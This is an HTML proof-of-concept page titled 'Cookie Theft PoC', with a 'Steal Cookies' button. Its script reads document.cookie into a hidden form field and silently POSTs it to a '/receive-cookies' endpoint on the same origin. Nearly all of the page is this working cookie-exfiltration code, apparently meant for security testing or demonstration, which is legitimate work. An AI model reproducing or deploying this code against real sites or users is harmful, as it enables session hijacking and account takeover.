<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cookie Theft PoC</title>
    <style>
        .test-button {
            display: block;
            margin: 20px;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            text-align: center;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Cookie Theft PoC</h1>
    <button class="test-button" onclick="triggerAttack()">Steal Cookies</button>

    <script>
        function triggerAttack() {
            // Create a hidden form
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '/receive-cookies'; // Endpoint on the same origin or a subdomain
            
            // Create a hidden input to store cookies
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'cookies';
            input.value = document.cookie;
            
            form.appendChild(input);
            document.body.appendChild(form);
            
            // Submit the form
            form.submit();
        }
    </script>
</body>
</html>
